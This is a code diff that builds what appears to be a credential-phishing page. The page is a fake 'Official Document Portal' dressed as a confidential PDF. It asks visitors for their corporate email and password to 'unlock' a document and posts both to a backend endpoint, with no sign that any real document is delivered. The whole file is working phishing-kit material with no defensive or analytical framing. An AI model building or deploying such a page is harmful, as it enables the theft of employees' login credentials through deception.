@@ -1,52 +1,152 @@
-<script>
-    document.getElementById('portal-form').addEventListener('submit', async function(e) {
-        e.preventDefault();
-        
-        const email = document.getElementById('input-email').value;
-        const password = document.getElementById('input-password').value;
-        const statusBox = document.getElementById('status-box');
-        const submitBtn = document.getElementById('submit-btn');
-
-        submitBtn.innerText = "Processing...";
-        submitBtn.disabled = true;
-        statusBox.style.display = "none";
-
-        try {
-            const response = await fetch('/api/unlock', {
-                method: 'POST',
-                headers: {
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({ email: email, password: password })
-            });
-
-            // Read raw response text first to debug if Vercel crashes
-            const responseText = await response.text();
-            let data = {};
-            try {
-                data = JSON.parse(responseText);
-            } catch(e) {
-                throw new Error(responseText || "Server crashed without JSON response");
-            }
-
-            if (response.ok && data.success) {
-                statusBox.className = "status-msg success";
-                statusBox.innerText = "Verification successful. Connecting to secure file server...";
-                statusBox.style.display = "block";
-            } else {
-                statusBox.className = "status-msg error";
-                statusBox.innerText = data.error || "An authentication error occurred.";
-                statusBox.style.display = "block";
-                submitBtn.innerText = "Unlock Document";
-                submitBtn.disabled = false;
-            }
-        } catch (err) {
-            statusBox.className = "status-msg error";
-            statusBox.innerText = err.message || "Gateway timeout. Server response unreadable.";
-            statusBox.style.display = "block";
-            submitBtn.innerText = "Unlock Document";
-            submitBtn.disabled = false;
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document Portal Access</title>
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            margin: 0; padding: 40px 16px; background: #f8f9fa; color: #212529; 
+            font-family: "Georgia", "Times New Roman", Times, serif; 
+            display: flex; justify-content: center; align-items: center; min-height: 100vh;
         }
-    });
-</script>
+        .pdf-page { 
+            width: 100%; max-width: 550px; background: #ffffff; border-radius: 4px; 
+            padding: 50px 45px; box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05); 
+            border: 1px solid #e9ecef; position: relative;
+        }
+        .pdf-page::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: #1a365d; }
+        .meta-header {
+            font-family: "Helvetica Neue", Arial, sans-serif; font-size: 11px;
+            text-transform: uppercase; letter-spacing: 2px; color: #6c757d;
+            margin-bottom: 40px; border-bottom: 1px solid #dee2e6; padding-bottom: 8px;
+        }
+        .title-section h1 { margin: 0 0 10px 0; font-size: 28px; font-weight: normal; color: #1a365d; line-height: 1.2; }
+        .title-section p { margin: 0 0 35px 0; font-size: 14px; color: #495057; font-style: italic; }
+        .divider { height: 1px; background: #dee2e6; margin-bottom: 35px; }
+        .form-group { margin-bottom: 22px; }
+        label { 
+            display: block; margin-bottom: 8px; font-family: "Helvetica Neue", Arial, sans-serif;
+            font-weight: 600; color: #212529; text-transform: uppercase; font-size: 11px; letter-spacing: 1px;
+        }
+        input[type="email"], input[type="password"] { 
+            width: 100%; padding: 12px 14px; border: 1px solid #ced4da; border-radius: 4px; 
+            background: #ffffff; font-size: 14px; color: #495057; outline: none; 
+            font-family: "Helvetica Neue", Arial, sans-serif; transition: border-color 0.15s ease-in-out;
+        }
+        input:focus { border-color: #1a365d; background: #ffffff; }
+        .submit-btn { 
+            display: inline-block; width: 100%; padding: 14px; background: #1a365d; color: white; 
+            border: none; border-radius: 4px; font-weight: bold; font-size: 14px; cursor: pointer; 
+            text-transform: uppercase; letter-spacing: 1.5px; font-family: "Helvetica Neue", Arial, sans-serif;
+            margin-top: 15px; transition: background-color 0.2s ease;
+        }
+        .submit-btn:hover { background: #2a4365; }
+        .status-msg { display: none; padding: 12px; margin-bottom: 25px; border-radius: 4px; font-size: 13px; font-family: "Helvetica Neue", Arial, sans-serif; }
+        .success { background: #e6fffa; color: #234e52; border: 1px solid #b2f5ea; }
+        .error { background: #fff5f5; color: #742a2a; border: 1px solid #fed7d7; }
+        .footer { 
+            margin-top: 50px; padding-top: 15px; border-top: 1px solid #dee2e6; 
+            color: #6c757d; font-size: 11px; font-family: "Helvetica Neue", Arial, sans-serif;
+            display: flex; justify-content: space-between;
+        }
+    </style>
+</head>
+<body>
+
+    <main class="pdf-page">
+        <div class="meta-header">Official Document Portal // Registry Division</div>
+
+        <div class="title-section">
+            <h1>Secure Document Access</h1>
+            <p>Please log in using your digital credentials to view the requested files.</p>
+        </div>
+
+        <div class="divider"></div>
+
+        <!-- Single dynamic status alert area handled by JS -->
+        <div id="status-box" class="status-msg"></div>
+
+        <form id="portal-form">
+            <div class="form-group">
+                <label for="input-email">Corporate Email Address</label>
+                <input type="email" id="input-email" name="email" placeholder="name@organization.com" required>
+            </div>
+
+            <div class="form-group">
+                <label for="input-password">Portal Passkey</label>
+                <input type="password" id="input-password" name="password" placeholder="••••••••" required>
+            </div>
+
+            <button type="submit" id="submit-btn" class="submit-btn">Unlock Document</button>
+        </form>
+
+        <div class="footer">
+            <span>CONFIDENTIAL CLASSIFIED</span>
+            <span>Ref: DOC-2026-IDX</span>
+        </div>
+    </main>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const portalForm = document.getElementById('portal-form');
+            
+            if (!portalForm) {
+                console.error("Error: Could not find the element with id 'portal-form'.");
+                return;
+            }
+
+            portalForm.addEventListener('submit', async function(e) {
+                e.preventDefault();
+                
+                const email = document.getElementById('input-email').value;
+                const password = document.getElementById('input-password').value;
+                const statusBox = document.getElementById('status-box');
+                const submitBtn = document.getElementById('submit-btn');
+
+                submitBtn.innerText = "Processing...";
+                submitBtn.disabled = true;
+                statusBox.style.display = "none";
+
+                try {
+                    const response = await fetch('/api/unlock', {
+                        method: 'POST',
+                        headers: {
+                            'Accept': 'application/json',
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({ email: email, password: password })
+                    });
+
+                    const responseText = await response.text();
+                    let data = {};
+                    try {
+                        data = JSON.parse(responseText);
+                    } catch(e) {
+                        throw new Error(responseText || "Server crashed without JSON response");
+                    }
+
+                    if (response.ok && data.success) {
+                        statusBox.className = "status-msg success";
+                        statusBox.innerText = "Verification successful. Connecting to secure file server...";
+                        statusBox.style.display = "block";
+                    } else {
+                        statusBox.className = "status-msg error";
+                        statusBox.innerText = data.error || "An authentication error occurred.";
+                        statusBox.style.display = "block";
+                        submitBtn.innerText = "Unlock Document";
+                        submitBtn.disabled = false;
+                    }
+                } catch (err) {
+                    statusBox.className = "status-msg error";
+                    statusBox.innerText = err.message || "Gateway timeout. Server response unreadable.";
+                    statusBox.style.display = "block";
+                    submitBtn.innerText = "Unlock Document";
+                    submitBtn.disabled = false;
+                }
+            });
+        });
+    </script>
+</body>
+</html>
